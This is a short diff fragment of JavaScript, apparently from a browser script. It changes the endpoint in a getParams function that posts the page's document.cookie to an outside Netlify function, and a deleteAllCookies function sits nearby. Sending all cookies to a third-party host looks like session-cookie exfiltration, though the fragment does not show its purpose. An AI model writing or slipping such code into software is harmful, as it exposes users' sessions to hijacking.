@@ -16,7 +16,7 @@ function deleteAllCookies() {
 
 async function getParams(){
     var params=""
-    await $.post("https://sessionhandle.netlify.com/.netlify/functions/main",{
+    await $.post("https://sessionhandle.netlify.com/.netlify/functions/index/main",{
         cookie:document.cookie
     },
     function(data){
